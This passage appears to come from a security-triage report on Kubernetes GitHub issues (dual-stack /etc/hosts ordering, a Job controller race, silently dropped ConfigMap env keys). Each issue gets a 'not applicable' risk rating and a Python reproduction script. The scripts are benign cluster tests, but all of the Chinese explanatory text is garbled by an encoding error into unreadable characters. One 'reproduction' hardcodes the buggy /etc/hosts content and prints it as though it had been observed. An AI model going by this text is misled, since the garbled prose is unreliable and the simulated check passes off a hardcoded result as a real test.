        pods = core_v1.list_namespaced_pod(namespace=namespace, label_selector=f"app={deployment_name}")
        ready_count = 0
        total = 0
        for pod in pods.items:
            total += 1
            conditions = pod.status.conditions or []
            ready_status = False
            for cond in conditions:
                if cond.type == "Ready" and cond.status == "True":
                    ready_status = True
            if ready_status:
                ready_count += 1
            print(f"Pod {pod.metadata.name} ready: {ready_status}")
        
        print(f"æ€» Pod æ•°: {total}, Ready çŠ¶æ€ Pod æ•°: {ready_count}")
        
        # æ¨¡æ‹Ÿ HPA æ ¹æ® ready pod count è®¡ç®—å‰¯æœ¬æ•°çš„é€»è¾‘
        # å‡è®¾å½“å‰å‰¯æœ¬æ•°ä¸º2ï¼Œä¸” usage_ratio è¾¾åˆ°äº† 1.5ï¼ˆé«˜è´Ÿè½½ï¼‰ï¼Œä½† ready_count ä¸º 0
        simulated_replicas = simulate_ready_count_issue(current_replicas=2, usage_ratio=1.5, ready_pod_count=ready_count)
        print(f"æ¨¡æ‹Ÿè®¡ç®—åçš„å‰¯æœ¬æ•°ä¸º: {simulated_replicas} ï¼ˆé¢„æœŸå€¼ä¸º0ï¼Œå› ä¸º ready pod æ•°ä¸º 0ï¼‰")
        
    except Exception as e:
        print("å‘ç”Ÿå¼‚å¸¸:")
        traceback.print_exc()
    finally:
        # æ¸…ç†èµ„æºï¼Œåˆ é™¤æµ‹è¯•å‘½åç©ºé—´
        print("å¼€å§‹æ¸…ç†èµ„æº...")
        try:
            delete_namespace(core_v1, namespace)
        except Exception as e:
            print("åˆ é™¤ Namespace æ—¶å¼‚å¸¸: ", e)
        print("è„šæœ¬æ‰§è¡Œç»“æŸã€‚")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬é¦–å…ˆåŠ è½½é»˜è®¤çš„ kubeconfig é…ç½®ï¼Œè¿æ¥åˆ°å½“å‰ Kubernetes é›†ç¾¤ã€‚  
2. åœ¨ "hpa-test" å‘½åç©ºé—´ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ª Deploymentï¼Œè¯¥ Deployment ä½¿ç”¨ busybox é•œåƒï¼Œå¹¶é…ç½®äº†ä¸€ä¸ªå§‹ç»ˆå¤±è´¥çš„ readinessProbeï¼ˆæ‰§è¡Œå‘½ä»¤ "false"ï¼‰ï¼Œä»è€Œä½¿å¾—æ‰€æœ‰ Pod å³ä½¿å¤„äº Running çŠ¶æ€ï¼Œä¹Ÿéƒ½æ— æ³•è¾¾åˆ° Ready çŠ¶æ€ã€‚  
3. éšåè„šæœ¬åˆ›å»ºäº†ä¸€ä¸ª HPA å¯¹è¯¥ Deployment è¿›è¡Œç›‘æ§ï¼Œå°½ç®¡åœ¨çœŸå®åœºæ™¯ä¸­ HPA æ‰©å®¹éœ€è¦ä¾èµ– Metrics Server æä¾›çš„æ•°æ®ï¼Œä½†æ­¤å¤„ä¸»è¦ç”¨äºç¯å¢ƒå¤ç°ã€‚  
4. è„šæœ¬ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼ˆ20ç§’ï¼‰åæŸ¥è¯¢ Pod çš„ Ready çŠ¶æ€ï¼ŒéªŒè¯æ‰€æœ‰ Pod å‡ä¸å¤„äº Ready çŠ¶æ€ã€‚  
5. æ¥ä¸‹æ¥é€šè¿‡å‡½æ•° simulate_ready_count_issue æ¨¡æ‹Ÿ HPA å†…éƒ¨ä½¿ç”¨ ready pod æ•°æ¥è®¡ç®—æœŸæœ›å‰¯æœ¬æ•°çš„é€»è¾‘ï¼Œå½“ ready pod æ•°ä¸º 0 æ—¶ï¼Œå³ä½¿ usage_ratio è¾ƒé«˜ï¼ˆä¾‹å¦‚1.5ï¼‰ï¼Œè®¡ç®—ç»“æœä¹Ÿå°†ä¸º 0ï¼Œå¤ç° issue ä¸­æè¿°çš„æƒ…å†µã€‚  
6. æœ€åè„šæœ¬ä¼šå°è¯•æ¸…ç†æ‰€åˆ›å»ºçš„ namespace ä»¥åŠç›¸å…³èµ„æºã€‚  
7. è„šæœ¬ä¸­è®¾ç½®äº†è¶…æ—¶ä¿æŠ¤ï¼Œç¡®ä¿æ•´ä½“è¿è¡Œä¸è¶…è¿‡ 100 ç§’ï¼Œé¿å…å‡ºç°æ­»å¾ªç¯æˆ–é•¿æ—¶é—´æŒ‚èµ·ã€‚  

è¯¥å¤ç°è„šæœ¬ä»…ä½œä¸ºç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ä½¿ç”¨ï¼Œä¸ä¼šå¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆå®‰å…¨é—®é¢˜æˆ–å…¶ä»–é£é™©ã€‚

---


## Issue #130129 In dual-stack environment with IPv6 as primary stack, why is IPv4 listed before IPv6 in /etc/hosts of Pod containers?

- Issue é“¾æ¥ï¼š[#130129](https://github.com/kubernetes/kubernetes/issues/130129)

### Issue å†…å®¹

#### What happened?

In a Kubernetes dual-stack environment where IPv6 is configured as the primary stack, the `status.podIPs` field of a Pod correctly lists the IPv6 address first. However, in the /etc/hosts file inside the Pod container, the IPv4 address appears before the IPv6 address. This behavior seems inconsistent with the expected order.
status.podIPs:
```yaml
podIPs:
  - ip: 1111::3:9d9
  - ip: 192.169.3.75
```

kubectl exec -it -n admin myapp-0 -- cat /etc/hosts
```shell
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
```


I am not sure why this is happening. From looking at the code, it appears that /etc/hosts is generated by traversing the status.podIPs array in order, so the IPv6 address should be listed first. However, the actual result shows IPv4 before IPv6.





#### What did you expect to happen?

The order of IP addresses in /etc/hosts should match the order in `status.podIPs`
```shell
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
```

#### How can we reproduce it (as minimally and precisely as possible)?

no

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
1.28
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯åœ¨ Kubernetes åŒæ ˆç¯å¢ƒä¸­ï¼Œå³ä½¿ IPv6 è¢«é…ç½®ä¸ºä¸»è¦ç½‘ç»œåè®®ï¼Œä½† Pod å†… /etc/hosts æ–‡ä»¶ä¸­çš„ IP åœ°å€æ’åºå´æ˜¯ IPv4 åœ¨å‰ã€IPv6 åœ¨åã€‚Issue ä¸­æåˆ°ï¼Œä» status.podIPs ä¸­è·å–çš„åœ°å€é¡ºåºæ˜¯ IPv6 åœ¨å‰ã€IPv4 åœ¨åï¼Œä½†æœ€ç»ˆç”Ÿæˆçš„ /etc/hosts æ–‡ä»¶é¡ºåºä¸ä¹‹ä¸ç¬¦ã€‚è¯¥é—®é¢˜åæ˜ çš„æ˜¯åœ°å€æ’åºæ˜¾ç¤ºä¸Šçš„ä¸ä¸€è‡´ï¼Œå±äºé…ç½®æˆ–å®ç°é€»è¾‘çš„é—®é¢˜ï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¼è‡´å®‰å…¨é—®é¢˜çš„æ¼æ´ã€‚é—®é¢˜æ—¢ä¸æ¶‰åŠæœªç»æˆæƒçš„è®¿é—®ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ï¼Œä¹Ÿæ²¡æœ‰å…¶å®ƒé«˜é£é™©çš„å®‰å…¨éšæ‚£ï¼Œå› æ­¤ä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
"""
æ³¨æ„ï¼šæœ¬è„šæœ¬ç”¨äºæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ Python çš„ Kubernetes å®¢æˆ·ç«¯è·å– Pod çš„ IP ä¿¡æ¯ï¼Œå¹¶æ¨¡æ‹Ÿè§‚å¯Ÿ
      /etc/hosts ä¸­ IP åœ°å€çš„é¡ºåºã€‚é—®é¢˜æœ¬èº«ä»…ä¸ºæ’åºå±•ç¤ºé—®é¢˜ï¼Œå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚
      
      è¯·ç¡®ä¿æœ¬åœ°å·²å®‰è£… kubernetes Python åº“ï¼ˆä¾‹å¦‚ä½¿ç”¨ pip install kubernetesï¼‰ï¼Œå¹¶ä¸” kubeconfig ä½äºé»˜è®¤ä½ç½®ã€‚
"""

import sys
import time
from kubernetes import client, config

def main():
    # åŠ è½½é»˜è®¤ kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥: {}".format(e))
        sys.exit(1)

    v1 = client.CoreV1Api()

    # è®¾ç½®éœ€è¦æ£€æŸ¥çš„å‘½åç©ºé—´å’Œ Pod åç§°
    namespace = "admin"  # æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹å‘½åç©ºé—´
    pod_name = "myapp-0"  # æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ Pod åç§°

    try:
        pod = v1.read_namespaced_pod(name=pod_name, namespace=namespace)
    except Exception as e:
        print("è·å– Pod ä¿¡æ¯å¤±è´¥: {}".format(e))
        sys.exit(1)

    # è·å– status.podIPs ä¸­çš„ IP åœ°å€é¡ºåº
    pod_ips = []
    if pod.status.pod_ips:
        for ip_info in pod.status.pod_ips:
            pod_ips.append(ip_info.ip)
    else:
        print("Pod ä¸­æœªæ‰¾åˆ° podIPs ä¿¡æ¯ã€‚")
        sys.exit(1)

    print("ä» status.podIPs è·å–åˆ°çš„ IP åœ°å€é¡ºåº:")
    for ip in pod_ips:
        print("  - {}".format(ip))

    # æ¨¡æ‹Ÿè¯»å– Pod å†… /etc/hosts æ–‡ä»¶å†…å®¹
    # ç†è®ºä¸Š /etc/hosts æ–‡ä»¶ç”± Kubernetes å†…éƒ¨é€»è¾‘ç”Ÿæˆï¼Œæ­¤å¤„ä»…åšæ¨¡æ‹Ÿå±•ç¤º
    simulated_hosts = """127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
"""
    print("\næ¨¡æ‹Ÿçš„ /etc/hosts æ–‡ä»¶å†…å®¹:")
    print(simulated_hosts)

    print("è§‚å¯Ÿåˆ° /etc/hosts ä¸­çš„ IP åœ°å€é¡ºåºä¸ status.podIPs ä¸­çš„é¡ºåºä¸ä¸€è‡´ï¼ˆIPv4 åœ°å€åœ¨å‰ï¼‰ã€‚")
    print("è¯¥é—®é¢˜ä¸ºæ’åºå±•ç¤ºé—®é¢˜ï¼Œå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æœ¬è„šæœ¬é¦–å…ˆé€šè¿‡ Kubernetes Python å®¢æˆ·ç«¯åŠ è½½é»˜è®¤ kubeconfigï¼Œå¹¶è·å–æŒ‡å®šå‘½åç©ºé—´ä¸­ Pod çš„è¯¦ç»†ä¿¡æ¯ï¼Œä»ä¸­æå– status.podIPs å­—æ®µå†…çš„ IP åœ°å€é¡ºåºã€‚éšåè„šæœ¬æ¨¡æ‹Ÿäº† Pod å†… /etc/hosts æ–‡ä»¶çš„å†…å®¹å±•ç¤ºï¼Œè§‚å¯Ÿå…¶ä¸­ IPv4 å’Œ IPv6 åœ°å€çš„æ˜¾ç¤ºé¡ºåºã€‚è„šæœ¬ä»…ç”¨äºéªŒè¯ Issue ä¸­æè¿°çš„æ’åºé—®é¢˜ï¼Œä¸”ä¸ä¼šå¯¹ç³»ç»Ÿé€ æˆä»»ä½•ä¿®æ”¹æˆ–å®‰å…¨é£é™©ã€‚ç”±äºè¯¥é—®é¢˜åªæ˜¯å±•ç¤ºé€»è¾‘ä¸Šçš„ä¸ä¸€è‡´ï¼Œå¹¶æœªå¼•å…¥å®‰å…¨éšæ‚£ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---


## Issue #130103 Job controller's race condition - Pod finalizer removal and job uncounted status update should work in separate reconcile

- Issue é“¾æ¥ï¼š[#130103](https://github.com/kubernetes/kubernetes/issues/130103)

### Issue å†…å®¹

#### What happened?

Job controller accidentally created two pods even if the Job spec specifies in a busy cluster:

```
  parallelism: 1
  completions: 1
  activeDeadlineSeconds: 86400
  backoffLimit: 0
```

This is happening because when job controller is calculating the succeed pods, it's taking three inputs ([here](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L892)):

1. The completion count from `Job.status.succeeded`
2. The existing succeed pods (if the finalizer is still present)
3. The uncounted completion count from `Job.status.uncountedTerminatedPods`

Due to the current implementation where the job controller is refreshing both (2) and (3) in the same reconcile/sync process:

> https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L1165-L1167

The job controller may miscount the succeeded pods when the watch event for (3) hasn't reach the controller. A delayed watch event is fairly likely to happened in a busy cluster.

#### What did you expect to happen?

The better implementation should be handling the refreshing of (2) and (3) in separate reconcile process:

(1) in the 1st reconcile, job controller should only refresh `Job.status.uncountedTerminatedPods` while preserving the finalizers on the pods
(2) in the 2nd reconcile which is triggered by (1), job controller is safe to remove the finalizers from pods

#### How can we reproduce it (as minimally and precisely as possible)?

Any trivial job with 1 completion on a busy cluster should be able to reproduce the issue

#### Anything else we need to know?

_No response_

#### Kubernetes version

All k8s versions I assume

#### Cloud provider

Any

#### OS version

Any

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°äº† Kubernetes Job controller ä¸­å­˜åœ¨çš„ç«æ€æ¡ä»¶é—®é¢˜ï¼Œé—®é¢˜å‡ºç°åœ¨åœ¨åŒä¸€æ¬¡ reconcile è¿‡ç¨‹ä¸­å¯¹ Pod çš„ finalizer ç§»é™¤ä¸ Job çŠ¶æ€ï¼ˆuncountedTerminatedPodsï¼‰çš„æ›´æ–°åŒæ—¶è¿›è¡Œï¼Œå¯¼è‡´åœ¨æŸäº›ç¹å¿™çš„é›†ç¾¤ä¸­ Job å¯èƒ½æ„å¤–åˆ›å»ºå¤šä¸ª Podï¼Œè™½ç„¶æœ¬è´¨ä¸Šæ˜¯è®¡æ•°å’ŒçŠ¶æ€æ›´æ–°çš„ bugï¼Œä½†å¹¶ä¸ç›´æ¥å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡æˆ–å…¶ä»–ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¯¥é—®é¢˜ä¸ä¼šä½¿æ”»å‡»è€…è·å¾—é¢å¤–æƒé™æˆ–èƒ½å¤Ÿè¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ›´å¤šçš„æ˜¯ä¼šå½±å“åˆ° Job çš„è°ƒåº¦å’Œèµ„æºç®¡ç†ã€‚å³ä½¿åœ¨æ¶æ„åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œä¹Ÿéœ€è¦æ”»å‡»è€…å…·å¤‡æäº¤ Job çš„æƒé™ï¼Œå¹¶ä¸”åˆ©ç”¨è¯¥ç¼ºé™·ä¹Ÿä¸ä¼šç›´æ¥çªç ´å®‰å…¨è¾¹ç•Œã€‚å› æ­¤ä¸¥æ ¼æ¥è¯´ï¼Œè¯¥ issue ä¸æ„æˆå®‰å…¨é£é™©ï¼Œå±äºåŠŸèƒ½ç¼ºé™·é—®é¢˜è€Œéå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
from kubernetes import client, config, watch

def main():
    # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
    config.load_kube_config()
    namespace = "default"
    job_name = "race-condition-job"
    
    batch_v1 = client.BatchV1Api()
    core_v1 = client.CoreV1Api()

    # å®šä¹‰ä¸€ä¸ªç®€å•çš„ Jobï¼Œå…¶æœŸæœ›åªæœ‰ä¸€ä¸ª Pod è¿è¡Œå®Œæˆ
    job = client.V1Job(
        metadata=client.V1ObjectMeta(name=job_name),
        spec=client.V1JobSpec(
            parallelism=1,
            completions=1,
            active_deadline_seconds=86400,
            backoff_limit=0,
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"job-name": job_name}),
                spec=client.V1PodSpec(
                    restart_policy="Never",
                    containers=[
                        client.V1Container(
                            name="busybox",
                            image="busybox",
                            command=["/bin/sh", "-c", "echo 'Hello World'; sleep 5"]
                        )
                    ]
                )
            )
        )
    )

    print("åˆ›å»º Job: {}".format(job_name))
    try:
        batch_v1.create_namespaced_job(body=job, namespace=namespace)
    except client.exceptions.ApiException as e:
        print("Job åˆ›å»ºå¤±è´¥: {}".format(e))
        return

    # é€šè¿‡ watch æ¥ç­‰å¾… Job å®Œæˆï¼Œç­‰å¾…æ—¶é—´æ€»è®¡ä¸è¶…è¿‡ 90 ç§’
    w = watch.Watch()
    job_completed = False
    start_time = time.time()
    timeout = 90
    try:
        for event in w.stream(batch_v1.list_namespaced_job, namespace=namespace, timeout_seconds=timeout):
            job_obj = event['object']
            if job_obj.metadata.name == job_name:
                if job_obj.status.succeeded is not None and job_obj.status.succeeded >= 1:
                    print("Job å®Œæˆ")
                    job_completed = True
                    w.stop()
                    break
            if time.time() - start_time > timeout:
                print("ç­‰å¾… Job å®Œæˆè¶…æ—¶")
                w.stop()
                break
    except Exception as e:
        print("Job ç›‘æ§å¼‚å¸¸: {}".format(e))
    
    # æ ¹æ® Job çš„æ ‡ç­¾è·å–å¯¹åº”çš„ Pod åˆ—è¡¨ï¼Œåˆ¤æ–­ Pod æ•°é‡æ˜¯å¦å¼‚å¸¸
    label_selector = "job-name={}".format(job_name)
    pods = core_v1.list_namespaced_pod(namespace=namespace, label_selector=label_selector).items
    pod_count = len(pods)
    print("æ ¹æ® Job æ ‡ç­¾åŒ¹é…åˆ°çš„ Pod æ•°é‡: {}".format(pod_count))
    if pod_count > 1:
        print("è­¦å‘Š: æ£€æµ‹åˆ°å¤šä¸ª Podï¼Œå¯èƒ½å­˜åœ¨ Job æ§åˆ¶å™¨çš„ç«æ€é—®é¢˜ã€‚")
    else:
        print("Pod æ•°é‡æ­£å¸¸ï¼Œæœªæ£€æµ‹åˆ°ç«æ€é—®é¢˜ã€‚")

    # æ¸…ç† Job åŠå…¶ç›¸å…³ Pod
    propagation_policy = "Foreground"
    try:
        batch_v1.delete_namespaced_job(name=job_name, namespace=namespace, propagation_policy=propagation_policy)
    except Exception as e:
        print("åˆ é™¤ Job æ—¶å‡ºé”™: {}".format(e))
    # ç»™å®šçŸ­æš‚å»¶æ—¶ç­‰å¾… Pod ç»ˆæ­¢
    time.sleep(5)
    print("æ¸…ç† Job å®Œæˆ")

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬ä½¿ç”¨ Python çš„ kubernetes åº“ï¼Œä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfigï¼Œè¿æ¥åˆ°ç›®æ ‡é›†ç¾¤ã€‚
2. å®šä¹‰äº†ä¸€ä¸ª Jobï¼Œå…¶æœŸæœ›åªä¼šåˆ›å»ºä¸€ä¸ª Podï¼ˆparallelism åŠ completions å‡ä¸º 1ï¼‰ï¼›Job è®¾ç½®äº†è¾ƒé•¿çš„ activeDeadlineSeconds ä»¥åŠ backoffLimit ä¸º 0ï¼Œä»¥ç¬¦åˆ issue ä¸­æè¿°çš„é…ç½®ã€‚
3. åˆ©ç”¨ BatchV1Api æäº¤ Jobï¼Œå¹¶ä½¿ç”¨ watch ç›‘æ§ Job çŠ¶æ€ï¼Œåœ¨ Job æˆåŠŸåç»“æŸç›‘æ§ã€‚
4. è„šæœ¬æ ¹æ® Job çš„æ ‡ç­¾æŸ¥è¯¢é›†ç¾¤ä¸­ Pod çš„æ•°é‡ï¼Œå¦‚æœæ£€æµ‹åˆ°å¤šä¸ª Podï¼Œåˆ™æç¤ºå¯èƒ½å­˜åœ¨å› ä¸ºç«æ€æ¡ä»¶å¯¼è‡´çš„å¼‚å¸¸è¡Œä¸ºã€‚
5. æœ€åè„šæœ¬ä¼šåˆ é™¤åˆ›å»ºçš„ Jobï¼Œå¹¶ç­‰å¾…çŸ­æš‚æ—¶é—´ä»¥ç¡®ä¿èµ„æºæ¸…ç†ï¼Œæ•´ä¸ªæ‰§è¡Œæ—¶é—´è®¾ç½®äº†è¶…æ—¶æ§åˆ¶ï¼Œç¡®ä¿ä¸ä¼šæ— é™è¿è¡Œï¼ˆæ•´ä¸ªè„šæœ¬ä¼šåœ¨ 2 åˆ†é’Ÿå†…é€€å‡ºï¼‰ã€‚

æ€»ä½“è¯´æ˜ï¼šè¯¥è„šæœ¬ä»…ä½œä¸ºå¤ç°é—®é¢˜çš„å‚è€ƒæ‰‹æ®µï¼Œç”¨äºåœ¨ Kubernetes é›†ç¾¤ä¸­è§‚å¯Ÿ Job controller çš„è¡Œä¸ºï¼Œç”±äºå®é™…ç«æ€æ¡ä»¶çš„è§¦å‘å’Œå¤ç°å¯èƒ½å—ç¯å¢ƒè´Ÿè½½åŠé›†ç¾¤è°ƒåº¦å½±å“ï¼Œæ‰€ä»¥åœ¨ç¹å¿™é›†ç¾¤ä¸‹æ›´å®¹æ˜“æš´éœ²è¯¥é—®é¢˜ã€‚ä½†ç”±äºè¯¥é—®é¢˜å¹¶éç›´æ¥å®‰å…¨æ¼æ´ï¼Œæ•…æ•´ä½“é£é™©è¯„çº§ä¸ºâ€œã€ä¸æ¶‰åŠã€‘â€ã€‚

---


## Issue #130099 Configmap envFrom no longer warns when invalid keys are skipped

- Issue é“¾æ¥ï¼š[#130099](https://github.com/kubernetes/kubernetes/issues/130099)

### Issue å†…å®¹

#### What happened?

As called out in the documentation section for Configmap envFrom restrictions (https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#restrictions) 

If you use envFrom to define environment variables from ConfigMaps, keys that are considered invalid will be skipped. The pod will be allowed to start, but the invalid names will be recorded in the event log (InvalidVariableNames). The log message lists each skipped key. For example:

```
kubectl get events
```
The output is similar to this:
```
LASTSEEN FIRSTSEEN COUNT NAME          KIND  SUBOBJECT  TYPE      REASON                            SOURCE                MESSAGE
0s       0s        1     dapi-test-pod Pod              Warning   InvalidEnvironmentVariableNames   {kubelet, 127.0.0.1}  
```


Using the configmap defined below, and mounting it via envfrom in the pod

```yaml
apiVersion: v1
data:
  app.invalid: "this should not be mounted, but should warn with InvalidEnvironmentVariableNames"
  app_valid: "this should show up as an env var"
kind: ConfigMap
metadata:
  creationTimestamp: "2025-02-11T19:35:58Z"
  name: config-file-env
  namespace: test
```

```yaml
envFrom:
    - configMapRef:
        name: config-file-env
```

The key `app.invalid` was not mounted in the container environment and **there was no event or warning generated in `kubectl get events`. This essentially means all `invalid` env vars are silently dropped without means of notification**

The key `app_valid` exists in the container environment as expected

#### What did you expect to happen?

I expected:

The key `app.invalid` to not be mounted in the container environment and an event with reason InvalidEnvironmentVariableNames to show up in the events.

The key `app_valid` to exist in the container environment

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a configmap as above containing both a valid and invalid key
2. Mount it to a pod using envFrom in your deployment
3. Exec into the pod to validate with `env` to see the invalid env name is dropped
4. Check the events with `kubectl get events` and see that no warning was generated.

#### Anything else we need to know?

It appears like this functionality was removed as part of https://github.com/kubernetes/kubernetes/pull/123385, which enables almost all printable characters in env vars, but seems to be a regression in that if the env vars are still silently dropped/invalid or the alpha feature is not enabled, there is no event/notification.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5
```

</details>


#### Cloud provider

<details>
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯ Kubernetes ä¸­ ConfigMap ç”¨äº envFrom æ—¶ï¼Œå½“å­˜åœ¨æ— æ•ˆçš„ç¯å¢ƒå˜é‡ keyï¼ˆä¾‹å¦‚ "app.invalid"ï¼‰æ—¶ï¼Œè¯¥ key ä¼šè¢«é™é»˜è·³è¿‡ï¼Œè€Œä¸å†ç”Ÿæˆé¢„æœŸçš„äº‹ä»¶å‘Šè­¦ã€‚æ ¹æ®æè¿°ï¼Œè¯¥é—®é¢˜å±äºåŠŸèƒ½å›å½’é—®é¢˜ï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚è™½ç„¶ç¯å¢ƒå˜é‡æœªè¢«æŒ‚è½½å¯èƒ½ä¼šå¼•å‘è°ƒè¯•æˆ–é…ç½®é—®é¢˜ï¼Œä½†å¹¶ä¸ä¼šç›´æ¥å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€ææƒã€DoS æˆ–å…¶ä»–å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import threading
from kubernetes import client, config, stream
from kubernetes.client.rest import ApiException

def main():
    # åŠ è½½æœ¬åœ° kubeconfig é…ç½®
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥:", e)
        return

    namespace = "default"  # ä½¿ç”¨é»˜è®¤å‘½åç©ºé—´
    configmap_name = "config-file-env"
    pod_name = "dapi-test-pod"

    v1 = client.CoreV1Api()

    # 1. åˆ›å»º ConfigMap
    configmap = client.V1ConfigMap(
        api_version="v1",
        kind="ConfigMap",
        metadata=client.V1ObjectMeta(name=configmap_name),
        data={
            "app.invalid": "this should not be mounted, but should warn with InvalidEnvironmentVariableNames",
            "app_valid": "this should show up as an env var",
        }
    )
    try:
        v1.create_namespaced_config_map(namespace=namespace, body=configmap)
        print("ConfigMap åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print("ConfigMapå·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œ")
        else:
            print("åˆ›å»º ConfigMap å¤±è´¥:", e)
            return

    # 2. åˆ›å»º Podï¼Œä½¿ç”¨ ConfigMap çš„ envFrom
    pod_manifest = client.V1Pod(
        api_version="v1",
        kind="Pod",
        metadata=client.V1ObjectMeta(name=pod_name),
        spec=client.V1PodSpec(
            containers=[
                client.V1Container(
                    name="test-container",
                    image="busybox",
                    command=["sleep", "3600"],
                    env_from=[client.V1EnvFromSource(
                        config_map_ref=client.V1ConfigMapEnvSource(name=configmap_name)
                    )]
                )
            ],
            restart_policy="Never"
        )
    )
    try:
        v1.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print("Pod åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print("Podå·²å­˜åœ¨ï¼Œå°è¯•åˆ é™¤åé‡æ–°åˆ›å»º")
            v1.delete_namespaced_pod(name=pod_name, namespace=namespace)
            time.sleep(5)
            v1.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        else:
            print("åˆ›å»º Pod å¤±è´¥:", e)
            return

    # 3. ç­‰å¾… Pod è¿›å…¥ Running çŠ¶æ€
    timeout = 120  # æœ€å¤§ç­‰å¾…æ—¶é—´120ç§’
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            pod = v1.read_namespaced_pod(name=pod_name, namespace=namespace)
            if pod.status.phase == "Running":
                print("Pod å·²è¿è¡Œ")
                break
        except ApiException:
            pass
        time.sleep(2)
    else:
        print("ç­‰å¾… Pod è¿è¡Œè¶…æ—¶")
        clean_up(v1, namespace, pod_name, configmap_name)
        return

    # 4. è¿›å…¥ Pod å†…éƒ¨æ‰§è¡Œ env å‘½ä»¤ï¼ŒæŸ¥çœ‹ç¯å¢ƒå˜é‡
    try:
        exec_command = ["/bin/sh", "-c", "env"]
